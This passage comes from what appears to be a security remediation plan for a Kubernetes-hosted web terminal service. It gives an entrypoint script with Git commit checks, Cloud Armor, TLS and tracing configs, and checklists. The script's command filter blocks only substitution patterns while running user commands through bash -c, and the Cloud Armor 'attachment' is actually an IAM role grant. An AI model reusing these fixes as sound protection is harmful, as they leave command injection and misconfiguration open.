app.post('/api/sessions', sessionLimiter, requireFirebaseUser, asyncHandler(async (req,res)=>{
  const startTime = Date.now();
  const user = (req as any).user;

  // ... validation and job creation ...

  let attempts = 0;
  try {
    podIP = await podWatcher.waitForPodIP(namespace, jobName, 30000);
    attempts = 1; // Track actual attempts in the watcher
  } catch (err) {
    attempts = 30; // Timeout
    throw err;
  } finally {
    podPollingAttempts.observe(attempts);
  }

  sessionsCreated.inc({ user_id: user.uid });
  sessionCreationDuration.observe((Date.now() - startTime) / 1000);

  // ... rest of code ...
}));
```

**Add ServiceMonitor for Prometheus Operator:**
```yaml
apiVersion: monitoring.coreos.com/v1
kind: ServiceMonitor
metadata:
  name: ws-cli-controller
  namespace: ws-cli
spec:
  selector:
    matchLabels:
      app: ws-cli-controller
  endpoints:
    - port: http
      path: /metrics
      interval: 30s
```

---

### Issue #20: Add Git Checksum Verification
**Severity:** HIGH
**File:** `runner/entrypoint.sh:18`

**Problem:**
- Git repos can't have SHA-256 verified
- Tampered repos go undetected

**Fix:** Verify Git commit SHA

**Implementation:**

**Update `runner/entrypoint.sh`:**
```bash
#!/usr/bin/env bash
set -euo pipefail

echo "[entrypoint] CODE_URL=${CODE_URL}"
[ -z "${CODE_URL:-}" ] && { echo "[fatal] CODE_URL is required"; exit 2; }

# Validation functions
validate_command() {
  local cmd="$1"
  if [[ "$cmd" =~ \$\( ]] || [[ "$cmd" =~ \` ]] || [[ "$cmd" =~ \$\{ ]]; then
    echo "[fatal] Command contains dangerous substitution patterns"
    return 1
  fi
  if [ ${#cmd} -gt 500 ]; then
    echo "[fatal] Command exceeds maximum length"
    return 1
  fi
  return 0
}

if [ -n "${COMMAND:-}" ]; then
  validate_command "${COMMAND}" || exit 1
fi
if [ -n "${INSTALL_CMD:-}" ]; then
  validate_command "${INSTALL_CMD}" || exit 1
fi

cd /work

# Handle different code URL types
case "$CODE_URL" in
  *.zip)
    curl -fL "$CODE_URL" -o bundle.zip
    BUNDLE_FILE="bundle.zip"
    ;;
  *.tgz|*.tar.gz)
    curl -fL "$CODE_URL" -o bundle.tgz
    BUNDLE_FILE="bundle.tgz"
    ;;
  *.git|*.git*)
    # Extract commit SHA if present in URL fragment
    if [[ "$CODE_URL" == *"#"* ]]; then
      BASE_URL="${CODE_URL%#*}"
      EXPECTED_COMMIT="${CODE_URL##*#}"
      git clone --depth=1 "$BASE_URL" src
      cd src
      ACTUAL_COMMIT=$(git rev-parse HEAD)
      if [ "$EXPECTED_COMMIT" != "$ACTUAL_COMMIT" ]; then
        echo "[fatal] Git commit mismatch. Expected: $EXPECTED_COMMIT, Got: $ACTUAL_COMMIT"
        exit 1
      fi
      echo "[entrypoint] Git commit verified: $ACTUAL_COMMIT"
      cd ..
    else
      git clone --depth=1 "$CODE_URL" src
      echo "[warning] No commit hash specified in Git URL. Skipping verification."
    fi
    ;;
  *)
    echo "[warning] Unknown file extension, assuming zip"
    curl -fL "$CODE_URL" -o bundle.zip
    BUNDLE_FILE="bundle.zip"
    ;;
esac

# Verify checksum for archives (not git clones)
if [ -n "${CODE_CHECKSUM_SHA256:-}" ] && [ -n "${BUNDLE_FILE:-}" ]; then
  if [ -f "$BUNDLE_FILE" ]; then
    echo "[entrypoint] Verifying checksum..."
    echo "${CODE_CHECKSUM_SHA256}  $BUNDLE_FILE" | sha256sum -c - || {
      echo "[fatal] Checksum verification failed"
      exit 1
    }
    echo "[entrypoint] Checksum verified"
  fi
fi

# Extract archives if not a git clone
if [ ! -d src ]; then
  mkdir -p src
  if [ -f bundle.zip ]; then
    unzip -q bundle.zip -d src || { echo "[fatal] unzip failed"; exit 3; }
  elif [ -f bundle.tgz ]; then
    tar -xzf bundle.tgz -C src --strip-components=1 || tar -xzf bundle.tgz -C src
  fi
fi

cd /work/src
# If the archive contains a single directory, cd into it
if [ $(ls -1 | wc -l) -eq 1 ] && [ -d "$(ls -1 | head -n1)" ]; then
  cd "$(ls -1 | head -n1)"
fi

echo "[entrypoint] installing..."
: "${INSTALL_CMD:=npm install}"
/bin/bash -c "${INSTALL_CMD}"

echo "[entrypoint] launching ttyd..."
export CLAUDE_PROMPT="${CLAUDE_PROMPT}"
exec ttyd -p 7681 -W -- /bin/bash -c "${COMMAND}"
```

**Usage example:**
```typescript
// Controller passes Git URL with commit hash
const code_url = "https://github.com/user/repo.git#abc123def456";
```

---

### Issue #21: Add Database Connection Health Checks
**Severity:** HIGH

**Fix:** Already covered in Issue #4 (checkDatabaseHealth function)

---

## PHASE 2: PRODUCTION HARDENING (1 WEEK)

### Issue #22: Deploy Cloud Armor
**Severity:** MEDIUM

**Problem:**
- No DDoS protection
- No WAF rules
- No bot detection

**Fix:** Create Cloud Armor security policy

**Implementation:**

**Create:** `infra/cloud_armor.tf`
```hcl
# Cloud Armor security policy
resource "google_compute_security_policy" "ws_cli_policy" {
  name        = "ws-cli-security-policy"
  description = "Security policy for ws-cli application"

  # Default rule - allow by default, then restrict
  rule {
    action   = "allow"
    priority = "2147483647"
    match {
      versioned_expr = "SRC_IPS_V1"
      config {
        src_ip_ranges = ["*"]
      }
    }
    description = "Default rule"
  }

  # Rate limiting rule
  rule {
    action   = "rate_based_ban"
    priority = "1000"
    match {
      versioned_expr = "SRC_IPS_V1"
      config {
        src_ip_ranges = ["*"]
      }
    }
    rate_limit_options {
      conform_action = "allow"
      exceed_action  = "deny(429)"
      enforce_on_key = "IP"
      ban_duration_sec = 600
      rate_limit_threshold {
        count        = 100
        interval_sec = 60
      }
    }
    description = "Rate limit: 100 requests per minute per IP"
  }

  # Block known bad IPs (example)
  rule {
    action   = "deny(403)"
    priority = "900"
    match {
      versioned_expr = "SRC_IPS_V1"
      config {
        src_ip_ranges = [
          # Add known malicious IPs here
          # "1.2.3.4/32"
        ]
      }
    }
    description = "Block known malicious IPs"
  }

  # SQLi protection
  rule {
    action   = "deny(403)"
    priority = "800"
    match {
      expr {
        expression = "evaluatePreconfiguredExpr('sqli-stable')"
      }
    }
    description = "SQL injection protection"
  }

  # XSS protection
  rule {
    action   = "deny(403)"
    priority = "700"
    match {
      expr {
        expression = "evaluatePreconfiguredExpr('xss-stable')"
      }
    }
    description = "XSS protection"
  }

  # Block specific regions (optional)
  # rule {
  #   action   = "deny(403)"
  #   priority = "600"
  #   match {
  #     expr {
  #       expression = "origin.region_code == 'CN' || origin.region_code == 'RU'"
  #     }
  #   }
  #   description = "Block specific regions"
  # }
}

# Attach to backend service
resource "google_compute_backend_service_iam_member" "armor_binding" {
  project         = var.project_id
  backend_service = "YOUR_BACKEND_SERVICE_NAME" # Get from GKE Ingress
  role            = "roles/compute.securityAdmin"
  member          = "serviceAccount:${google_service_account.controller_sa.email}"
}
```

**Apply to Ingress:**
```yaml
# In k8s/controller.yaml Ingress annotations
metadata:
  annotations:
    kubernetes.io/ingress.class: "gce"
    cloud.google.com/armor-config: '{"ws-cli-security-policy": "ws-cli-security-policy"}'
```

---

### Issue #23: Add TLS Certificates with cert-manager
**Severity:** MEDIUM

**Fix:** Install cert-manager and configure

**Implementation:**

**Install cert-manager:**
```bash
kubectl apply -f https://github.com/cert-manager/cert-manager/releases/download/v1.13.0/cert-manager.yaml
```

**Create:** `k8s/certificate.yaml`
```yaml
apiVersion: cert-manager.io/v1
kind: ClusterIssuer
metadata:
  name: letsencrypt-prod
spec:
  acme:
    server: https://acme-v02.api.letsencrypt.org/directory
    email: admin@yourdomain.com
    privateKeySecretRef:
      name: letsencrypt-prod
    solvers:
      - http01:
          ingress:
            class: gce

---
apiVersion: cert-manager.io/v1
kind: Certificate
metadata:
  name: ws-cli-controller-cert
  namespace: ws-cli
spec:
  secretName: ws-cli-controller-tls
  issuerRef:
    name: letsencrypt-prod
    kind: ClusterIssuer
  dnsNames:
    - ${DOMAIN}

---
apiVersion: cert-manager.io/v1
kind: Certificate
metadata:
  name: ws-cli-gateway-cert
  namespace: ws-cli
spec:
  secretName: ws-cli-gateway-tls
  issuerRef:
    name: letsencrypt-prod
    kind: ClusterIssuer
  dnsNames:
    - ${WS_DOMAIN}
```

**Update Ingress:**
```yaml
# k8s/controller.yaml
spec:
  tls:
    - hosts:
        - ${DOMAIN}
      secretName: ws-cli-controller-tls
  rules:
    - host: ${DOMAIN}
      # ... rest
```

---

### Issue #24: Implement Distributed Tracing
**Severity:** MEDIUM

**Fix:** Add OpenTelemetry

**Implementation:**

**Update `controller/package.json`:**
```json
{
  "dependencies": {
    "@opentelemetry/api": "^1.7.0",
    "@opentelemetry/sdk-node": "^0.45.0",
    "@opentelemetry/auto-instrumentations-node": "^0.40.0",
    "@opentelemetry/exporter-trace-otlp-http": "^0.45.0"
  }
}
```

**Create:** `controller/src/tracing.ts`
```typescript
import { NodeSDK } from '@opentelemetry/sdk-node';
import { getNodeAutoInstrumentations } from '@opentelemetry/auto-instrumentations-node';
import { OTLPTraceExporter } from '@opentelemetry/exporter-trace-otlp-http';
import { Resource } from '@opentelemetry/resources';
import { SemanticResourceAttributes } from '@opentelemetry/semantic-conventions';

const traceExporter = new OTLPTraceExporter({
  url: process.env.OTEL_EXPORTER_OTLP_ENDPOINT || 'http://localhost:4318/v1/traces'
});

const sdk = new NodeSDK({
  resource: new Resource({
    [SemanticResourceAttributes.SERVICE_NAME]: 'ws-cli-controller',
    [SemanticResourceAttributes.SERVICE_VERSION]: process.env.VERSION || '1.0.0'
  }),
  traceExporter,
  instrumentations: [getNodeAutoInstrumentations()]
});

export function initTracing() {
  sdk.start();
  console.log('Tracing initialized');
}

process.on('SIGTERM', () => {
  sdk.shutdown()
    .then(() => console.log('Tracing terminated'))
    .catch((error) => console.log('Error terminating tracing', error))
    .finally(() => process.exit(0));
});
```

**Update `controller/src/server.ts`:**
```typescript
import { initTracing } from './tracing.js';

if (process.env.ENABLE_TRACING === 'true') {
  initTracing();
}

// ... rest of code
```

---

### Issue #25-32: Additional Production Items

**Issue #25: Test Backup/Restore**
- Document in runbook
- Schedule monthly tests
- Automate with Cloud Scheduler

**Issue #26: Container Image Scanning**
```yaml
# Add to cloudbuild.yaml
- name: gcr.io/google.com/cloudsdktool/cloud-sdk:470.0.0
  id: scan-images
  entrypoint: bash
  args:
  - -c
  - |
    gcloud artifacts docker images scan ${_REGION}-docker.pkg.dev/$PROJECT_ID/${_REPO}/${_BASENAME}-controller:$SHORT_SHA
    gcloud artifacts docker images scan ${_REGION}-docker.pkg.dev/$PROJECT_ID/${_REPO}/${_BASENAME}-gateway:$SHORT_SHA
    gcloud artifacts docker images scan ${_REGION}-docker.pkg.dev/$PROJECT_ID/${_REPO}/${_BASENAME}-runner:$SHORT_SHA
```

**Issue #27: Complete Frontend**
- Out of scope for security review
- Implement Firebase Auth UI
- Add xterm.js terminal
- Add session management UI

**Issue #28: Sealed Secrets**
```bash
# Install sealed-secrets
kubectl apply -f https://github.com/bitnami-labs/sealed-secrets/releases/download/v0.24.0/controller.yaml

# Create sealed secret
kubeseal --format yaml < secret.yaml > sealed-secret.yaml
```

**Issue #29: Security Audit**
- Hire external pentesting firm
- Schedule after P0+P1 fixes complete

**Issue #30: Load Testing**
```bash
# Use k6 or Locust
k6 run --vus 100 --duration 30s loadtest.js
```

**Issue #31: Disaster Recovery Plan**
- Document in runbook
- Test quarterly

**Issue #32: Compliance Review**
- Depends on industry (HIPAA, SOC2, etc.)
- Document after production hardening

---

## TESTING CHECKLIST

### P0 Critical Fixes Testing

- [ ] Command injection: Test with malicious commands
- [ ] CORS: Test with unauthorized origins
- [ ] Rate limiting: Create 10+ sessions rapidly
- [ ] SSRF: Test with private IPs and metadata URLs
- [ ] Database errors: Simulate connection loss
- [ ] Network policies: Test pod isolation
- [ ] Build pipeline: Deploy ws-gateway successfully
- [ ] .gitignore: Verify secrets not committed

### P1 High Priority Testing

- [ ] Pod security: Verify non-root execution
- [ ] Resource quotas: Test cluster limits
- [ ] PDB: Test node drain scenarios
- [ ] Audit logs: Verify all events logged
- [ ] Metrics: Check Prometheus scraping
- [ ] Query timeouts: Test with slow queries
- [ ] KMS: Verify JWT signing works

### P2 Production Hardening Testing

- [ ] Cloud Armor: Test rate limiting
- [ ] TLS: Verify HTTPS endpoints
- [ ] Tracing: Check spans in Cloud Trace
- [ ] Backup restore: Full DR test

---

## DEPLOYMENT CHECKLIST

### Pre-Deployment
- [ ] All P0 issues fixed
- [ ] All P1 issues fixed (for life-critical)
- [ ] Unit tests passing
- [ ] Integration tests passing
- [ ] Security scan clean
- [ ] Load test successful
- [ ] Backup tested

### Deployment
- [ ] Terraform apply
- [ ] Database schema applied
- [ ] Secrets created
- [ ] Cloud Build successful
- [ ] Pods healthy
- [ ] Metrics flowing
- [ ] Logs flowing

### Post-Deployment
- [ ] Smoke tests passing
- [ ] Monitoring alerts configured
- [ ] On-call rotation established
- [ ] Runbook documented
- [ ] Incident response plan ready

---

## RUNBOOK CREATION

Create `RUNBOOK.md` with:
- Architecture diagram
- Deployment procedures
- Troubleshooting guides
- Incident response
- Rollback procedures
- Contact information

---

## ESTIMATED TIMELINE

| Phase | Duration | Engineers | Status |
|-------|----------|-----------|--------|
| P0 Critical Fixes | 5-7 days | 1 senior | REQUIRED |
| P1 High Priority | 10-14 days | 2 senior | REQUIRED (life-critical) |
| P2 Production | 5-7 days | 2 | RECOMMENDED |
| Testing & Validation | 3-5 days | 1 QA | REQUIRED |
| **TOTAL** | **23-33 days** | **2-3 people** | - |

---

## RISK MATRIX

| Issue | Current Risk | After Fix | Impact if Not Fixed |
|-------|--------------|-----------|---------------------|
| Command Injection | CRITICAL | LOW | Full cluster compromise |
| CORS | CRITICAL | LOW | Token theft, unauthorized access |
| Rate Limiting | CRITICAL | LOW | Cluster DoS, service outage |
| SSRF | CRITICAL | LOW | Internal network exposure |
| DB Error Handling | CRITICAL | LOW | Service outage |
| Network Policies | CRITICAL | LOW | Lateral movement attacks |
| Missing Gateway | CRITICAL | LOW | Service non-functional |
| Pod Security | HIGH | LOW | Container escape |
| No Audit Logs | HIGH | LOW | Cannot investigate incidents |

---

## CONTACT & ESCALATION

**For implementation questions:**
- Review this document section by section
- Implement fixes in order (P0 → P1 → P2)
- Test thoroughly after each fix

**For security concerns:**
- Do NOT deploy until P0 fixes complete
- Consider external security audit after P1 fixes

**For life-critical deployment:**
- P0 + P1 fixes are MANDATORY
- External audit HIGHLY RECOMMENDED
- Load testing REQUIRED
- DR plan REQUIRED

---

**END OF PLAN**

This plan should be executed by experienced engineers familiar with Kubernetes, TypeScript/Node.js, and Google Cloud Platform. Each issue should be addressed methodically with proper testing before moving to the next.
